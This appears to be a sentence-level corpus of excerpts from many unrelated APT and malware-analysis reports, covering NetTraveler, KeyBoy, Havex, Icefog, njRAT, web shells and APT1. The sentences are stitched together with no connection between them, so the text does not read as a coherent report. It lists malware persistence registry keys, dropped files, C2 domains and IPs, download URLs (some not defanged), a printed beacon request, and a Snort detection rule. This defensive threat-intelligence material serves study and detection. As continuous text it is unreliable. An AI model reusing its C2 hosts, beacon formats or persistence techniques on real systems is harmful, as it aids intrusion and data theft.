If the malware failed to locate the proxy server it unregisters current malicious service by deleting corresponding registry keys in HKLM\System\ CurrentControlSet\ < servicename > \ and at- tempts to delete all related files from the fol- lowing list : Otherwise , if the proxy was checked successful- ly the malware writes the following value to the config file ( config_t.dat ) : After that the module sleeps for 60 seconds and starts a new thread ( see below Thread1 ) , sleeps 10 more seconds and creates another thread ( see below Thread2 ) .
The exploit drops > > % temp % \netmgr.dll > > % temp % \netmgr.exe > > % temp % \perf2012.ini > > % temp % \sysinfo2012.dll > > % temp % \winlogin.exe The malware command and control server script is at `` hxxp : //www.faceboak.net/2012nt/ nettraveler.asp '' .
The module main purpose is to install and embedded DLL file or load it during system startup .
Given the command structure above , it is logical to assume that the command and control server requires an operator to manually issue specific commands to the victim workstation , with the default command likely being 'sleep ' .
After a command and control message is received , OrcaRAT sends an HTTP POST message back to the command and control server .
Each branch of command and control activity is determined by the unique response from the remote server .
After the configuration file is written , it checks if the malware was previously installed or not , if not , it creates a dynamic-link library in the `` system32 '' folder , creates a temporary batch file named as `` temp.bat '' which installs the previous DLL as a service on the system .
The contents of both the files are as follows : Filename : AllIndex.ini Filename : AllIndex.ini_d It 's pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following image : Apart from that , this variant also creates a file that lists all the currently running processes on the victim machine , into a text file named `` Process.dll '' inside the currently logged-on user 's `` temp '' folder .
Our analysis is currently focussed only on the malware samples that are dropped on the target systems , as the exploits used during the spear-phishing campaign are older & already patched by the respective vendors .
- Creates and maintains client network connections to remote server using the SMB protocol MBR destruction is done through a 'number ' value of the registry key value of the items checked below ( `` 0 '' if the destructive behavior than the largest value ) is set to '0 ' value at the time of initial infection .
MD5 and V3 diagnostic information on malicious files identified vulnerability Hangul file and generated by the current is as follows .
- The Wired AutoConfig ( dot3svc ) service is responsible for Performing IEEE 802.1X - The WLANSVC service Logic Provides the Required to Configure , Discover , Connect to , and disconnect from a Wireless local Area network .
If the request and the Via field exist , the server variant authenticates the client and responds with HTTP/1.0 200 Server : Apache/2.2.3 ( Red Hat ) Accept-Ranges : bytes Content-Type : text/html Proxy-Connection : keep-alive If the client 's request does not meet the appropriate authentication criteria , the server variant sends : HTTP/1.0 400 Bad Request Server : Apache/2.2.3 ( Red Hat ) Connection : close With a communication channel between the server variant and the client established , the server sends information about the victim 's computer .
Failing this , the mainLoop determines if the victim 's machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe .
The server variant utilizes a device driver in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later .
Based on this , the malware has likely modified the system registry on the compromised computers in such a way that the RAT gets executed as a service by the trusted process 'svchost.exe ' each time the computer is started .
After sending the detailed beacon to the command and control server , the compromised computer appeared to expect a response from the server .
It provides options to digitally sign the malware , specify its connection mode ( connect/listen/sniff ) , install the malware in one of several covert manners , recover the System Service Dispatch Table ( SSDT ) before installation , and abort installation if a virtual machine is detected .
It has some of the following capabilities : In the past , variants of the DarkComet and AcromRAT malware have also been observed beaconing to the same Command & Control ( CnC ) servers used by the Unrecom RAT in this campaign .
One simple example of how the emails in this phishing campaign are related is that the Command and Control node ( 184.22.201 [ .
These backdoors provide a persistent foothold , using a separate command and control channel ; allowing future access less likely to be correlated to the original activity .
Following are the hashes of the exploit file : THAM luan- GD- NCKH2.doc When executed the exploit initially creates and launches a dropper at location % Temp % \svchost.exe with the following hashes : svchost.exe This payload then creates a DLL file in system32 called CREDRIVER.dll , which is in fact the actual backdoor : CREDRIVER.dll We also identified another document exploiting CVE-2012-0158 , but this time apparently targeting some Indian individuals .
Firstly , thanks to the fixed patterns used by the malware in the authentication procedure , we can detect outbound traffic from infected hosts with the following simple Snort rule : alert tcp $ HOME_NET any - > $ EXTERNAL_NET any ( msg : '' KeyBoy Backdoor Login '' ; flow : to_server ; content : '' |c4 4c 87 3f 11 1e c4 1a| '' ; depth:8 ; sid:1000001 ; rev:1 ; classtype : trojan-activity ; reference : url , community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar geted-attacks- against-vietnam-and-india ) The simplest way to identify an infection on a given Windows system , is just to look for the existence of the file C : \WINDOWS\system32\CREDRIVER.dll or of a service called MdAdum .
You can easily decode the content of the payload with the following Python snippet : The previous packet decodes to the following : $ login $ LAB 192.168.56.101 MyUser 2013/06/06 23:56:24 Proxy 20130401 While reverse engineering the backdoor we noticed that the malware expects the following messages from the C & C server it contacts : Sysinfo FileManager Download UploadFileOk Shell Intrigued by its capabilities , we started reconstructing the communication protocol and practically building a tool that would operate just like the original controller used by the attackers .
To this day , we continue to observe waves of blunt phishing attacks from compromised hosts in the Middle East , showing threat actors using multiple tools ( including njRAT , AdwindRAT , Xtreme RAT , and H-Worm ) in clustered phishing attacks against the same targets .
Reactor ( http : //www.eziriz.com/ ) This document provides details of the njRAT campaign codes used , versions , ports , and CnC nodes currently observed sending commands to victim systems .
`` njRAT '' is a robust remote access trojan ( RAT ) which upon reaching and infecting an end-point , allows the attacker to have full control over the victim system .
Our network forensic analysis was performed by investigating the following to packet capture files : The analyzed capture files contain pure IPv6 traffic ( CERNET is a IPv6 network ) which made the analysis a bit different then usual .
The round-trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server .
The evidence we 've observed instead indicate that the MITM attack is performed either by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy .
) When the DLL first runs , it installs itself permanently into two places on the victim 's computer : • C : \Documents and Settings\All Users\Application Data\Microsoft\ Windows\Burn\ % COMPUTERNAME % .dll
After infecting your computer , the shellcode loads a new copy of Word to display a decoy document that is hidden inside the malicious file .
This component decodes the Command-and-Control ( C & C ) server names that the final malware will use , and saves them to the registry entry HKCU\Software\ Microsoft\Windows Media\XC .
Overall , this malware was observed to send information about the computer and set up a backdoor for remote access .
The downloaded `` JPG '' file was analyzed to be a backdoor in the victim 's machine .
The spear phishing document was in RTF format which as designed loads MSCOMCTL.ocx and exploits CVE 2012-0158 .
The good news is that if an entity is actively patching Windows PE files for Windows Update , the update verification process detects it , and you will receive error code 0×80200053 .
If you follow the three steps from the official MS answer , two of those steps result in downloading and executing a MS 'Fixit ' solution executable .
Since the user , not the automatic update process , is initiating these downloads , these files are not automatically verified before execution as with Windows Update .
This backdoor also has functionality to load additional plugins from the command and control server .
If the CPU core check detects more than one core , it implants the NewCT2 RAT in % temp % \MSSoap.DLL ( some variants will use BurnDCSrv.DLL and IntelAMTPP.DLL ) and executes the written file .
The command and control server in question was located at 58.64.201.229 .
The media type of the request is chosen from the following list :  ICMP protocol the attackers can choose to use ICMP ( ping ) to exfiltrate data  SMTP protocol the attackers can send exfiltrated data by email  Named pipe the attackers can use Microsoft 's named pipe to communicate to another infected machine .
It can spy on each and every infected machine and manages to send the exfiltrated information back to the attackers , by relaying this exfiltrated data through infected machines to one machine with Internet connection .
This information can be used to perform `` pass the hash '' 2 attacks , to compromise new systems within the infrastructure  information gathering tools , to get information on the infected system  RAR tools , to create archives of stolen documents  Microsoft Office document stealer  … The driver injects several libraries into user land .
That email contained a malicious excel �le , which once opened and its VBA code executed , would infect the victim 's computer .
Logs and proxy servers should be checked for communication with the IP addresses with which the malware communicates : 83.170.33.60 83.170.33.37 If you think you got infected , check in the system root folder for a �le called NTUSER.DAT .
In this report we analyze one case of an operation protective edge themed spear phishing attack .
It does not have a driver component and the installer drops the main DLL component directly to the local application data ( non- roaming ) folder .
The response of the command and control server will be encrypted using the id field in the POST request as the key .
We believe they are either dropped by another executable that uses social engineering tricks to mislead the user into executing the installer , or by documents containing exploits that silently perform the installation .
While it appears that the attackers used spear-phishing ( via email ) , their primary technique was the use of a `` watering-hole '' attack whereby they attack websites known to be frequented by the target using techniques such as SQL injection , and upload malicious files to these website .
Symantec believes that the exploits were packed with a Trojan and Command & Control ( C2 ) server address using a platform that gives the group its name : `` Elderwood .
Purpose : Exfiltration of `` a historically unprecedented transfer of wealth-closely guarded national secrets ( including those from classified government networks ) , source code , bug databases , email archives , negotiation plans and exploration details for new oil and gas field auctions , document stores , legal contracts , supervisory control and data acquisition ( SCADA ) configurations , design schematics , and much more '' Entry Method : Spear Phishing Countries with Companies Affected : U.S. Synopsis : Dell SecureWorks gives a fairly good collection of technical details about the campaign they 've dubbed `` Mirage '' for the string used to connect to the C2 server by the Remote Access Trojan , but largely they focused on studying the tool , not monitoring the APT activity .
In order to do that , the malware injects itself into the EXPLORER.EXE process , sends a GET/POST request to the PHP script on the compromised website , then reads the HTML document returned by the script , looking for a base64 encrypted data between the two `` havex '' strings in the comment tag < ! -- havexhavex -- > and writes this data it to a % TEMP % \ < tmp > .xmd
Besides backdoor functionality , it also extracts credentials from Internet Explorer 's password manager to the prx.jpg file and injects a small DLL into the processes of web browsers .
All harvested data is compressed , encrypted and written into the % TEMP % \*.yls files , which are then sent to the C & C by the main Havex/Sysmain module .
Sample B is identiﬁed to be a HTTP controlled backdoor , enabling the attacker to take full control over the victim computer .
A full request looks like : The user agent is always Sent accept headers are : The malware creates in a value 'AppID ' with the data it calculates from GetTickcount ( ) , used as an identiﬁer/mutex .
We assume the ﬁle is only dropped and/or executed on request via stage 2 of Miniduke and not running persistently .
file that drops a decoy document pertaining to the alleged incompetence of Pakistani authorities in locating Osama Bin Laden ( OBL ) .
Meanwhile , the Naxalites_Funded_By_Pakistan.scr file drops a slightly different malware component and an alternate decoy document .
This file contained a version number 1.0 , likely denoting the version of the backdoor and/or the command and control ( C2 ) backend .
The ROP payload basically tries to make memory at 0×18184000 executable , and to return to 0x1818411c to execute the shellcode .
CVE-2010-3962 , then a 0-day exploit in Internet Explorer 6 , 7 , and 8 dropped the Pirpi payload discussed in this previous case .
They are extremely proficient at lateral movement and are difficult to track , as they typically do not reuse command and control infrastructure .
To summarize , it is obvious that this executable module is a backdoor , capable of taking screenshots , stealing files , downloading new files from the Internet , starting and killing processes , including interactive Windows shell commands , file search and interaction with mysql database server .
If the system has a running process named `` 360tray.exe '' , then the embedded file is stored in % SYSTEM % \MFC42LOC.DLL , then copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp and runs a new process from that location via WMI Win32_Process.Create method .
Whichever protocol is used ( with or without extra encryption ) , the workflow of communication between the bot and the C & C stays the same at the initial stage of operation : ● The bot sends the first data block , thus signaling itself ; ● In response , the C & C sends back the list of available plugins ● The bot starts to download plugins , sending one request at a time to download each plugin ● The C & C sends the requested plugin ● The bot sends a message that the plugin has arrived .
Known data blocks and their configuration IDs : Known executable modules and their plugin IDs : The attackers can dynamically add and delete plugins inside the VFS and each victim installation has a different set of plugins depending on the type of activity the attackers need to execute .
Once the encrypted third stage is read from the registry or NTFS EAs , it is decrypted using the RC5 algorithm and a fixed 16-byte key that is hardcoded in the second stage .
Just like the first stage , it loads the encrypted body of the next stage from the end of the physical disk and decrypts it with a hardcoded RC5 key , then decompresses it using the nrv2 algorithm from the UCL library .
AhnlabUpdate drops and runs an additional executable , which is the RAT payload that establishes a connection with the control server .
• Get bot version and uptime • Get directory file listing , all drives or from specific path • Stop activities for a given period • Download file • Send local file to the server • Execute shell command • Connect to IRC server • Change nick ( IRC ) • Join channel ( IRC ) • IRC disconnect • Remove bot from system The HTTP portion is designed to get configuration data used in the IRC botnet and to send stolen documents back to the control server .
After executing , the remote-access Trojan makes a connection to sujewha.com , the IRC control server .
They connect to the Command and Control server wreckmove.org ( 188.240.47.145 ) via HTTP on port 80 , using a peculiar and recognizable pattern : GET /flaws/snwd.php ? tp=1 & tg= [ ID ] & tv=Error [ ] & ts= [ PLATFORM ] & mt= [ account ] & tr= [ NoFiles ] & Y1Y5F2 HTTP/1.1 Accept : */* Accept-Encoding : gzip , deflate User-Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET
The initial spear phishing mail contained two files as attachments – a document named `` 220113.doc '' , and an executable file `` few important operational documents.doc.exe '' .
On this site there 's what appears to be an installer for the Bitdefender antivirus product ( bitdefender_tsecurity.zip , md5 62b702a15a762692eda296b0aea270f9 ) , but the zip file contains both a real installer and a Visual Basic trojan identical to the one used against Telenor .
Using a web shell as a primary backdoor gives Deep Panda several advantages : Low to virtually no detection by antivirus products The absence of command and control beacon traffic Impossible to block known malicious IP addresses to a web server since adversary can easily change their source IP address Cookie and HTTP header authentication aware web shells avoid being enumerated by search engines and restrict access , further reducing their network footprint To assist organizations with identifying web shells in their environment , this post will cover two popular Deep Panda web shells .
As a simple example of an encoded command , the following GET request would cause the backdoor to execute the code Response.Write ( `` < h1 > Hello World < /h1 > '' ) and would render '' Hello World '' to be printed in the web browser : Path : C : \inetpub\wwwroot\aspnet_client\system_web\ < VERSION > \ MD5 Hash : cc875db104a602e6c12196fe90559fb6 File Size : 45187 Table 4 : Metadata of `` system_web.aspx '' System_web.aspx is an excellent example of a more robust web shell used to replace Deep Panda 's traditional beaconing command and control infrastructure .
Parts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment : A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP .
The svchost.exe initiates an outbound connection to a command and control ( C2 ) server hosted at thejoe.publicvm.com .
Packet capture on port 1321/tcp : ShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites .
A fake `` svchost.exe '' is installed in the victim 's Application Data directory : C : \Documents and Settings\ < Username > \Application Data\svchost.exe Dropped files on execution of VPN-Pro.exe : Examination of the `` svchost.exe '' binary shows multiple references to `` ShadowTech Rat .
Figure 3 : RC4 key , C & C information , and campaign mark The malware then accesses a C & C server over HTTP POST to send data using the domain name and URL path in SafeCredential.DAT .
php , which provided the functionality for data exfiltration ; and utils.php , which contained the encryption functions in order to encrypt and decrypt communications between a compromised host and a C & C server .
The names of the plug-ins are : • OpenDoc • UsbDoc • UsbExe Tools The tools used by Safe are off-the-shelf programs that are able to extract saved passwords from Internet Explorer® ( IE ) and Mozilla Firefox® as well as any stored Remote Desktop Protocol ( RDP ) credentials .
Until now , we have only found spreading mechanisms that use social engineering via malicious PDF files sent over e-mail ( see Appendix F : Forged documents↓ ) .
If it is a DLL file , it attempts to load it via LoadLibrary ( ) ; if it is an EXE file , it gets written on disk with one of the following names : winupdt.exe , wcsntfy.exe , netmngr.exe , dumpreport.exe , taskhosts.exe , wupdmngr.exe , winhlp.exe , dllhosts.exe , dxdiagupd.exe , dialers.exe , netschd.exe , connwiz.exe , certupdt.exe , repfault.exe , wuapreport.exe , lanmgr.exe .
As the malicious PDF file is opened , the Adobe process gets exploited , which results in running the dropper .
The following images were found during online research : The following table provides information about some of the servers hosting and distributing malware and some of the filename patterns discovered : The following table provides information about the relationship between the malicious servers , detection names by antivirus tools , and vertical market affected ( based on unique hashes and detections ) : A bot malware has features like anti-reversing , credential stealing/keystroke logging/form grabbing , DNS changer , process injection , antivirus process killing , blocking of security related websites , backdoor , and others .
This section presents information about some of the servers we have observed hosting and distributing malware , filename patterns , as well as a triage analysis of various pieces of malware observed delivered by these servers - Servers observed hosting and distributing malware : - Some of the filename patterns observed : - Triage analysis of various pieces of malware observed delivered by servers mentioned in this report : ( Please note that the activity in this section has been recorded per initial file infection and not individually per file downloaded and executed by the initial malware under investigation ) o Andromeda MD5 : 036eb11a5751c77bc65006769921c8e5 This file was observed hosted in the following servers : 1 .
Some of the main Bot types of malware detected through this research include : -­‐ Andromeda Andromeda is a modular bot that downloads modules and updates from its command and control ( C & C ) server during execution .
SwissRanger camera driver ( sysmain dropper ) A hijacked installer of libMesaSR used by the `` SwissRanger '' camera driver , produced by Acroname : http : //www.acroname.com/ Files details : SHA-256 : 398a69b8be2ea2b4a6ed23a55459e0469f657e6c7703871f63da63fb04cefe90 Size : 1311927 Compiled : Sat , 28 May 2011 16:04:38 UTC Detected as : Trojan.Win32.Inject.hhwa Description : trojanized installer Path : % TEMP % \tmp687.dll and % APPDATA % \sydmain.dll SHA-256 : a8e6abaa0ddc34b9db6bda17b502be7f802fb880941ce2bd0473fd9569113599 Size : 133152 Compiled : Wed , 12 Jun 2013 04:31:14 UTC Detected as : Trojan.Win32.Inject.hhwa Description : Sysmain backdoor Path : % TEMP % \setup.exe SHA-256 : 7fa188fb3bfecbd0fbbb05cfa4a3078ac44f68c63b784b20046e470613e35f96 Size : 1181500 Compiled : Sat , 05 Dec 2009 22:50:52 UTC Description : original installer , version 1.0.14.706 Registry modification : [ HKCU\Software\Microsoft\Windows\CurrentVersion\Run ] load = C : \WINDOWS\system32\rundll32.exe `` c : \documents and settings\luser\application data\sydmain.dll '' , AGTwLoad eWon software ( Havex dropper ) A hijacked installer of eCatcher - a piece of legitimate software developed by a Belgian producer of SCADA and industrial network equipment : http : //www.ewon.be/en/home.html Files details : SHA-256 : 70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9 Size : 43971440 Compiled : Sat , 31 Mar 2007 15:09:46 UTC Detected as : ( not detected yet ) Description : trojanized installer Url : hxxp : //www.ewon.biz/software/eCatcher/eCatcherSetup.exe Path : % TEMP % \TmProvider.dll and % SYSTEM % \TMPProvider.dll SHA-256 : 401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67 Size : 327168 Compiled : Mon , 30 Dec 2013 12:53:48 UTC Description : Havex version 038 Path : % TEMP % \eCatcherSetup.exe SHA-256 : c7caa7fa2a23508b0a024a6a4b2dcaad34ab11ea42dffc3a452901c007cdfc34 Size : 43785864 Compiled : Fri , 19 Jun 1992 22:22:17 UTC Description : original installer , version 4.0.0.13073 Path : % TEMP % \qln.dbx Size : 2 Description : text file with Havex version number Registry modification : [ HKCU/HKLM\Software\Microsoft\Windows\CurrentVersion\Run ] TmProvider = rundll32 `` % SYSTEM % \TMPprovider038.dll '' , RunDllEntry [ HKLM\Software\Microsoft\Internet Explorer\InternetRegistry ] fertger = 269684507736283195770098FD80-25 mbCheck software ( Havex dropper ) A hijacked installer of legitimate software for the remote maintenance of PLC systems - mbCHECK produced by MB Connect Line GmbH : http : //www.mbconnectline.com/index.php/en/ Files details : SHA-256 : 0b74282d9c03affb25bbecf28d5155c582e246f0ce21be27b75504f1779707f5 Size : 1141478 Compiled : Sun , 14 Jul 2013 20:09:51 UTC ) Detected as : Trojan-Dropper.Win32.Injector.kcnn Description : Trojanized installer Path : and % SYSTEM % \svcprocess043.dll % TEMP % \mbCHECK.dll SHA-256 : d5687b5c5cec11c851e84a1d40af3ef52607575487a70224f63458c24481076c Size : 437248 Compiled : Fri , 11 Apr 2014 05:37:36 UTC Description : Havex version 043 Resource : 12.MTMxMjMxMg==.5.havex.14400000.12.Explorer.EXE.0.2.66.sinfulce lebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php.90.ra pidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-sett ings/bp-settings-src.php.354.AATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED 9LxIVQr2Z/gsrHIsgTvK9AusdFo+9..fzAxf1zXj42880+kUmktmVb5HSYi8T27Q 54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk..09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja +Ml4SI7e60C4qDQAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAQAB .
1st stage samples SHA-256 : 1b3cf050d626706d32c1c2c1cbd4975d519cfbdb9bca0f2e66b7e1120030b439 size : 538152 timestamp : Fri , 19 Jun 1992 22:22:17 UTC sources : hXXp : //lafollettewines.com/blog/wp-includes/pomo/inden2i.php ? dwl=fne hXXp : //kenzhebek.com/tiki/files/templates/listpages/inden2i.php ? dwl=fne dropped as : dxpserver.exe , corensys.exe , wbemmonitor.exe detected as : Trojan.Win32.Benban.yc SHA-256 : b1a3e67200a3837ecf45481885c2eca88f89509443a0bcec01b12aa737007a9b size : 248360 timestamp : Fri , 19 Jun 1992 22:22:17 UTC detected as : Trojan-Dropper.Win32.Clons.aqwj SHA-256 : fcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915 size : 271400 timestamp : Fri , 19 Jun 1992 22:22:17 UTC source : www.nahoonservices.com/wp-content/plugins/rss-poster/juch.php dropped as : searchindexer.exe detected as : Trojan-Dropper.Win32.Clons.ampw SHA : a553384eeadf4ad39e6c89bf16a146c01ebf627d042485844d75cd67b421afb8 size : 248360 timestamp : Fri , 19 Jun 1992 22:22:17 UTC signature : Trojan-Dropper.Win32.Clons.apvc This backdoor comes packed with UPX and a custom Delphi packer .
The encoding algo was a simple additive 0x1010101 against every four bytes of the reversed string '' kenzhebek.com/tiki/files/templates/listpages/hoem.php '' , which was downloaded as a Havex backdoor .
During our investigation , we identified several types of exploits being used through spear-phishing e-mails against the targets : > > CVE-2012-1856 ( the `` Tran Duy Linh '' ( also see : http : //blog.malwaretracker.com/2013/06/ tomato-garden-campaign-possible.html ) exploit fixed in Microsoft 's MS12-060 security bulletin ) > > CVE-2012-0158 ( the MSCOMCTL.OCX remote code execution vulnerability fixed with Microsoft 's MS12-027 security bulletin ) > > Web links to Oracle Java exploits ( CVE-2013-0422 and CVE-2012-1723 ) > > HLP exploits and abuse of features > > HWP exploits The first two vulnerabilities are exploited through Microsoft Office documents ( Word and Excel ) that drop and execute the backdoor and show a fake `` lure '' document to the victim .
The `` update.exe '' is a standard Icefog dropper , with the following information : Upon execution , it installs the Icefog malware as `` sxs.dll '' in the Internet Explorer folder ( usually `` C : \ Program Files\Internet Explorer '' ) : To receive control , the malware DLL ( `` sxs.dll '' ) uses a technique known as `` DLL search order hijacking '' , which abuses the fact that Internet Explorer will load this file from its own directory , instead of the Windows SYSTEM folder .
To execute the code , a simple call to CreateThread ( ) suffices : The shellcode is encrypted with a simple 0xBF XOR operation : Upon execution , the shellcode installs an Icefog backdoor that communicates with the C2s at : '' www.samyongonc [ dot ] com/jd/upload.aspx '' and `` www.625tongyi [ dot ] com/jd/upload.aspx '' During our investigation , we observed Icefog attacks using HWP files .
• The analysis showed that the perpetrator succeeded in creating and uploading several files to the web server that contained malicious code , allowing the perpetrator to send commands to the server from a remote location .
Examples of such attempts include luring Internet users into execution of malware and Spear Phishing .
• The images were analysed for traces in system files and properties , logs from firewalls were secured and analysed , KPMG also analysed all traffic to and from the compromised servers .
This continues to suggest that intruders either have local or remote access to headquarters systems running netsat.exe or access to another application that automates remote C2 data/file retrieval .
The following reflects observations during field unit execution from an infected external drive : File Name : netsat.exe File Size : 43520 bytes MD5 : eb8399483b55f416e48a320d68597d72 Previous analysis results indicated netsat.exe retrieved commands from an encrypted file named netwn.drv resident in the CSIDL_WINDOWS\msagent\ directory .
The headquarters component infects drives connected to its host system with the field unit component and retrieves data from the field unit on the infected drive 's return to the headquarters host system .
It has two key components : the Web shell command-and-control ( CnC ) client binary and a text-based Web shell payload ( server component ) .
This small , text-based payload can be delivered using any of the following mechanisms : • WebDAV file upload • JBoss jmx-console or Apache Tomcat management pages ( For more details on this attack vector , read FireEye consultant Tony Lee 's explanation ) • Remote exploit with a file drop • Lateral propagation from other access After examining the server-side payload and the client used to control the Web shell , the next step to understanding China Chopper is observing its traffic .
The server-side content could easily be overlooked among the other files associated with a vanilla install of a complex application .
[ 6 ] Below are some of the names of Etumbot installers using RTLO successfully : As the backdoor executes from our previous example , C : \DOCUME~1\User\LOCALS~1\Temp\ kb71271.log is created and contains the following registry file to make the malware persistent : [ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ] `` JavaSvc '' = '' C : \\Documents and Settings\\User\\Application Data\\JAVA\\JavaSvc.exe '' The dropper then calls regedit with kb71271.log as a parameter to modify the registry .
Returning to the first sample , once the dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs the Etumbot backdoor ( 82d4850a02375a7447d2d0381b642a72 ) , an initial HTTP beacon is sent to the Command & Control server that requests an RC4 encryption key .
Stage one has been seen to leverage the Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or Microsoft Office documents to convince the user to click and therefore execute the malware , which then runs the backdoor and displays the distraction file .
Once the server executes on a target 's endpoint , it connects to a PIVY client installed on the attacker 's machine , giving the attacker control of the target system .
The tools are available for download at the following locations : • https : //github.com/fireeye/pycommands • https : //github.com/fireeye/chopshop By tracking the PIVY server activity , security professionals can find these telltale indicators : • The domains and IPs used for Command and Control ( CnC ) • The attacker 's PIVY process mutex • The attacker 's PIVY password • The launcher code used in the malware droppers • A timeline of malware activity This report explains how Calamine can connect these and other facets of the attack .
Figure 2 : Data and functions referenced as offsets to the struct pointed to by the ESI register Poison Ivy features a complex , custom network protocol over TCP .
These are used both to steal data and credentials from compromised machines , and to use the machine as a staging post to conduct attacks against further systems on the network , allowing the attackers to spread their compromise within the organization .
Frequently the group deploys a remote access trojan ( RAT ) on compromised machines .
ESA can block spear phishing emails sent by threat actors as part of their campaign .
Our initial conclusion was that this traffic was the result of malicious actors 'sleeping ' their implants , by pointing their command and control domains at legitimate IP addresses .
We observed this actor target : Google Code Command and Control Furthermore , we also discovered this same actor conducting a parallel campaign that leveraged Google Code for command and control .
We decoded the commands hosted at these linked projects and found that they issued the following decoded commands : It is likely that other yet to be discovered Kaba variants are configured to connect to these related Google Code projects and then redirect to this list of IP addresses .
This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems .
Filename : main.dll File size : 13824 bytes MD5 hash : 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash : 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes : 32-bit version of malware , which beacons to 58.64.178.77:443 .
Filename : css.jpg File size : 168776 bytes MD5 hash : b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash : 394703d1240ccd3aaeeef50c212313e3036741b1 Notes : Executable file downloaded by Java Applet that has been encoded with XOR 0Ã-99 Taking a closer look at the resulting executable we have , it turns out it is a newer sample of PlugX .
We can not confirm the initial compromised sites , but we noted traffic to several known re-direct sites and the malware was configured to use the same command and control ( C2 ) server .
Watering hole attacks offer a much better chance of success because they involve compromising legitimate websites and installing malware intended to compromise website visitors .
In contrast to many other APT campaigns , which tend to rely heavily on spear phishing to gain victims , '' th3bug '' is known for compromising legitimate websites their intended visitors are likely to frequent .
WEBC2 backdoors typically give APT1 attackers a short and rudimentary set of commands to issue to victim systems , including : »» Open an interactive command shell ( usually Windows ' cmd.exe ) »» Download and execute a file »» Sleep ( i.e .
This script performs the following functions and saves the results to a text file : »» Display the victim 's network configuration information »» List the services that have started on the victim system »» List currently running processes »» List accounts on the system »» List accounts with administrator privileges »» List current network connections »» List currently connected network shares »» List other systems on the network »» List network computers and accounts according to group ( `` domain controllers , '' `` domain users , '' `` domain admins , '' etc .
APT groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and devices inside of a victim network .
The following is the network traffic observed : The following table provides information of some of the fields observed in the network traffic : Information sent by the attacker on opened windows in the system could inform him/her of his malware being analyzed and allowed to connect to the C2 node .
0.08 3f2e9251bcd17a2cb17e9202d1b100d3 The following processes were started when the `` Authorization.exe '' malware was executed : C : \Windows\System32\netsh.exe % APPDATA % \msnco.exe The following files were created when the `` Authorization.exe '' malware was executed : % APPDATA % \msnco.exe C : \WINDOWS\Prefetch\AUTHORIZATION.EXE-0AD199D6.pf C : \Documents and Settings\ % USERNAME % \Start Menu\Programs\Startup\b6554e5bcfef391ff7a7ffda58092e10.exe C : \WINDOWS\Prefetch\NETSH.EXE-085CFFDE.pf C : \WINDOWS\Prefetch\MSNCO.EXE-1616CBE8.pf [ CWD ] \.tmp ( or when created by the original dropper : `` C : \Extracted\.tmp '' ) The following registry values were set by the `` Authorization.exe '' malware when it was executed : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\b6554e5 bcfef391ff7a7ffda58092e10 [ Value : `` [ % APPDATA % ] \msnco.exe '' ..
] HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Para meters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\ [ % APPDATA % ] \msnco.exe [ Value : [ % APPDATA % ] \msnco.exe : * : Enabled : msnco.exe ] Indicators & Mitigation Strategies : The following three ( 3 ) tables will provide information about some of the malware observed to be njRAT itself or carrier files that once executed dropped njRAT in the victim system .
